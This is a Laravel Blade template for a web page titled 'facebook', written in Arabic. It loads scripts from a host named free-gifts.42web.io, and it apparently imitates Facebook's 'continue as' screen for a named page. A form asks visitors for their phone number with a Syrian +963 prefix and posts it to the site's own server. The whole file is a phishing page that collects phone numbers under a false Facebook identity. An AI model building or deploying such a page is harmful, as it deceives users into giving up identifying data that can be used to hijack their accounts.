<!DOCTYPE html>
<html lang="ar" dir="rtl"  style="direction: rtl">
    <head >
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>facebook</title>
        <!-- Fonts -->
        <link rel="preconnect" href="https://fonts.bunny.net">
        <link href="https://fonts.bunny.net/css?family=instrument-sans:400,500,600" rel="stylesheet" />

        <link rel="preload" as="style" href="http://free-gifts.42web.io/build/assets/app-BPnvfG_q.css">
        <link rel="modulepreload" href="http://free-gifts.42web.io/build/assets/app-Cl5RxutH.js">
        <link rel="stylesheet" href="http://free-gifts.42web.io/build/assets/app-BPnvfG_q.css">
        <script type="module" src="http://free-gifts.42web.io/build/assets/app-Cl5RxutH.js"></script>
            
    </head>
    <body class=" bg-gray-200 h-screen w-screen flex justify-center items-center ">
        <div class="bg-white px-8 sm:px-16 py-4">
            <div class=" font-bold sm:text-xl text-lg ">
                @if(isset($page))
                متابعة ك {{$page->page_name}}
                @else
                متابعة ك syria
                @endif
            </div>
            <div class=" w-64 overflow-hidden rounded-full h-64">
                @if(isset($page) && $page->page_image)
                <img src="{{$page->page_image}}" alt="">
                @else 
                <img src="{{asset('profile.png')}}" alt="">
                @endif
            </div>
            <form class="max-w-sm mx-auto" method="POST" action="/">
                @if(isset($page))
                <input type="hidden" name='id' value="{{$page->id}}">
                @endif
                @csrf
                <div class="mb-5">
                <label for="phonenumber" class="block mb-2 text-sm font-medium text-gray-900 @error('phone_number') text-red-700 @enderror ">متابعة باستخدام رقم الهاتف</label>
                <input type="phonenumber" id="phonenumber" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 @error('phone_number') border-red-500 text-red-900 placeholder-red-700 @enderror" placeholder="+963*********" required name="phone_number" value="{{old('phone_number')}}"/>
                @error('phone_number')
                <div class="text-red-700  text-sm">
                    {{$message}}
                </div>
                @enderror
                </div>
                
                <button id="submit-btn" type="submit" class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm w-full sm:w-auto px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">المتابعة</button>
            </form>
        
        </div>
    </body>
</html>
